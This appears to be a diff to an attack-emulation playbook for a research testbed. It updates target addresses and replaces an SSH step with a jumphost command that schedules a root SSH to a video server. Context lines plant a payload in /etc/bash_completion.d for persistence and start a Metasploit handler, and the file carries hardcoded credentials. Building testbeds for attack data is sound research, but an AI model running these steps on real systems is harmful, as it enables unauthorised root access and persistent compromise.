@@ -4,10 +4,10 @@
 #
 ####################
 vars:
-  $SERVER_ADDRESS: 192.42.0.254
+  $SERVER_ADDRESS: video.attackbed.com
   $ATTACKER_ADDRESS: 192.42.1.174
   $DNS_SERVER: 192.42.0.233
-  $DOMAIN: aecid-testbed.com
+  $DOMAIN: attackbed.com
   $USER: aecid
   $DNS_LIST: /usr/local/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
   $SSH_KEY: {{sshkey.public_key}}
@@ -215,13 +215,9 @@ commands:
     cmd: "cat /var/www/default/payload > /etc/bash_completion.d/accesss.log"
     session: "foothold"
 
-  - type: ssh
-    cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@172.17.100.121 '. /etc/bash_completion'" | at now + 10 minute
-    hostname: $ADMIN_SERVER
-    username: aecid
-    password: aecid
-    jmp_hostname:  192.42.1.232
-    exit_on_error: False
+ # connect via jumphost to admin host, that ssh to videoserver to reboot
+  - type: shell
+    cmd: ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o "ProxyCommand=ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p aecid@$MGMT_IP" aecid@$ADMIN_SERVER 'echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@172.17.100.121 '. /etc/bash_completion'" | at now + 10 minute' 
 
   - type: msf-module
     cmd: exploit/multi/handler
